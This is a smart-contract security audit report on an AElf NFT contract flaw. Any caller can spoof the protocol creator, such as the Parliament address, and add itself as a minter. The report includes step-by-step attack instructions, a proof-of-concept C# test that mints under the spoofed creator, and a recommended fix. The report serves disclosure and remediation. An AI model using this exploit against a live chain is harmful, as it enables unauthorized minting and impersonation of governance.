# Audit Report

## Title
Privilege Escalation via Arbitrary Creator Assignment in NFT Protocol Creation

## Summary
The `Create()` function in the NFT contract accepts an arbitrary `input.Creator` address without validating that it matches `Context.Sender`, allowing any caller to create NFT protocols with spoofed creators (such as Parliament) while adding themselves to the minter list. This grants attackers unauthorized minting privileges that can only be revoked by the spoofed creator address.

## Finding Description

The vulnerability exists in the NFT protocol creation flow where caller-supplied creator addresses are accepted without validation. [1](#0-0) 

The function assigns the creator as either the provided `input.Creator` or defaults to `Context.Sender` if null, but critically fails to validate that a non-null `input.Creator` matches the actual caller. This creator value is then used to:

1. **Set the token issuer in MultiToken contract**: [2](#0-1) 

2. **Populate the initial minter list**: [3](#0-2) 

The attacker's address from `input.MinterList` is added alongside the spoofed creator, establishing dual minting authority.

The MultiToken contract accepts this arbitrary issuer because the NFT contract is whitelisted for token creation: [4](#0-3) 

When the whitelisted NFT contract calls token creation, no issuer validation occurs: [5](#0-4) 

**Attack Execution**:
1. Attacker calls `Create()` with `input.Creator = ParliamentAddress` and `input.MinterList = [AttackerAddress]`
2. NFT protocol is created with `protocolInfo.Creator = ParliamentAddress`
3. Token is registered in MultiToken with `Issuer = ParliamentAddress`
4. Minter list becomes `[AttackerAddress, ParliamentAddress]`
5. Attacker can now mint NFTs because minting only checks minter list membership: [6](#0-5) 

6. Only the spoofed creator (Parliament) can remove the attacker: [7](#0-6) 

## Impact Explanation

**Critical Impact:**
- **Supply Integrity Violation**: Attackers can mint NFTs up to the `TotalSupply` limit, creating unauthorized tokens that appear legitimately issued by governance entities
- **Privilege Escalation**: By spoofing Parliament or other high-privilege addresses as creators, attackers create protocols that falsely appear to be officially sanctioned
- **Irrevocable Access**: The attacker's minting privileges cannot be revoked except by the spoofed creator address, which may never discover these rogue protocols
- **Reputation Damage**: Malicious NFTs appearing to originate from trusted governance addresses undermine protocol trust and legitimacy

The vulnerability directly compromises token supply integrity and authorization controls, which are fundamental security guarantees of the NFT system.

## Likelihood Explanation

**High Likelihood:**
- **Public Access**: The `Create()` function has no access controls and can be called by any address [8](#0-7) 
- **Minimal Requirements**: Only requires knowledge of target addresses (e.g., Parliament default organization) which are publicly discoverable
- **Single Transaction**: Attack executes in one transaction with no complex preconditions
- **No Rate Limits**: No mechanisms prevent repeated exploitation
- **Poor Detectability**: No events distinguish legitimate from malicious protocol creation, requiring active monitoring by governance to detect

## Recommendation

Add validation to ensure the creator address matches the actual caller:

```csharp
public override StringValue Create(CreateInput input)
{
    Assert(Context.ChainId == ChainHelper.ConvertBase58ToChainId("AELF"),
        "NFT Protocol can only be created at aelf mainchain.");
    
    // Validate creator matches sender
    if (input.Creator != null)
    {
        Assert(input.Creator == Context.Sender, 
            "Creator address must match transaction sender.");
    }
    
    var creator = input.Creator ?? Context.Sender;
    // ... rest of function
}
```

Alternatively, remove the `Creator` field from `CreateInput` entirely and always use `Context.Sender` as the creator, eliminating the possibility of spoofing.

## Proof of Concept

```csharp
[Fact]
public async Task Test_ArbitraryCreatorSpoofing()
{
    // Get Parliament default organization address
    var parliamentAddress = await ParliamentContractStub.GetDefaultOrganizationAddress.CallAsync(new Empty());
    
    // Attacker creates protocol with spoofed Parliament creator
    var attackerAddress = DefaultSender; // Any attacker address
    var result = await NFTContractStub.Create.SendAsync(new CreateInput
    {
        Creator = parliamentAddress, // Spoofed creator
        MinterList = new MinterList { Value = { attackerAddress } }, // Attacker as minter
        NftType = "Art",
        ProtocolName = "Malicious NFT",
        TotalSupply = 10000,
        BaseUri = "https://malicious.com/",
        IsBurnable = true,
        IssueChainId = ChainHelper.ConvertBase58ToChainId("AELF")
    });
    
    var symbol = result.Output.Value;
    
    // Verify protocol creator is Parliament (spoofed)
    var protocolInfo = await NFTContractStub.GetNFTProtocolInfo.CallAsync(new StringValue { Value = symbol });
    Assert.Equal(parliamentAddress, protocolInfo.Creator);
    
    // Verify attacker is in minter list
    var minterList = await NFTContractStub.GetMinterList.CallAsync(new StringValue { Value = symbol });
    Assert.Contains(attackerAddress, minterList.Value);
    
    // Attacker can mint NFTs
    await NFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = symbol,
        Alias = "token1",
        TokenId = 1,
        Metadata = new Metadata(),
        Quantity = 1,
        TokenHash = HashHelper.ComputeFrom("token1")
    });
    
    // Verify token was minted with Parliament as issuer
    var tokenInfo = await TokenContractStub.GetTokenInfo.CallAsync(new GetTokenInfoInput { Symbol = symbol });
    Assert.Equal(parliamentAddress, tokenInfo.Issuer);
}
```

**Notes:**
- The vulnerability affects the core NFT protocol creation mechanism
- The NFT contract must be in the MultiToken whitelist for normal operation, which enables this bypass
- Parliament would need to actively monitor all NFT creations to detect spoofing attempts
- Each spoofed protocol creates persistent, difficult-to-revoke minting privileges for the attacker

### Citations

**File:** contract/AElf.Contracts.NFT/NFTContract_Create.cs (L14-14)
```csharp
    public override StringValue Create(CreateInput input)
```

**File:** contract/AElf.Contracts.NFT/NFTContract_Create.cs (L22-22)
```csharp
        var creator = input.Creator ?? Context.Sender;
```

**File:** contract/AElf.Contracts.NFT/NFTContract_Create.cs (L23-34)
```csharp
        var tokenCreateInput = new MultiToken.CreateInput
        {
            Symbol = symbol,
            Decimals = 0, // Fixed
            Issuer = creator,
            IsBurnable = input.IsBurnable,
            IssueChainId = input.IssueChainId,
            TokenName = input.ProtocolName,
            TotalSupply = input.TotalSupply,
            ExternalInfo = tokenExternalInfo
        };
        State.TokenContract.Create.Send(tokenCreateInput);
```

**File:** contract/AElf.Contracts.NFT/NFTContract_Create.cs (L36-38)
```csharp
        var minterList = input.MinterList ?? new MinterList();
        if (!minterList.Value.Contains(creator)) minterList.Value.Add(creator);
        State.MinterListMap[symbol] = minterList;
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Views.cs (L259-265)
```csharp
    private bool IsAddressInCreateWhiteList(Address address)
    {
        return address == Context.GetZeroSmartContractAddress() ||
               address == GetDefaultParliamentController().OwnerAddress ||
               address == Context.GetContractAddressByName(SmartContractConstants.EconomicContractSystemName) ||
               address == Context.GetContractAddressByName(SmartContractConstants.CrossChainContractSystemName);
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L56-74)
```csharp
            if (!IsAddressInCreateWhiteList(Context.Sender) &&
                input.Symbol != TokenContractConstants.SeedCollectionSymbol)
            {
                var symbolSeed = State.SymbolSeedMap[input.Symbol.ToUpper()];
                CheckSeedNFT(symbolSeed, input.Symbol);
                // seed nft for one-time use only
                long balance = State.Balances[Context.Sender][symbolSeed];
                DoTransferFrom(Context.Sender, Context.Self, Context.Self, symbolSeed, balance, "");
                Burn(Context.Self, symbolSeed, balance);
            }
        }

        var tokenInfo = new TokenInfo
        {
            Symbol = input.Symbol,
            TokenName = input.TokenName,
            TotalSupply = input.TotalSupply,
            Decimals = input.Decimals,
            Issuer = input.Issuer,
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L355-358)
```csharp
    public override Empty RemoveMinters(RemoveMintersInput input)
    {
        var protocolInfo = State.NftProtocolMap[input.Symbol];
        Assert(Context.Sender == protocolInfo.Creator, "No permission.");
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L398-399)
```csharp
        var minterList = GetMinterList(tokenInfo);
        Assert(minterList.Value.Contains(Context.Sender), "No permission to mint.");
```
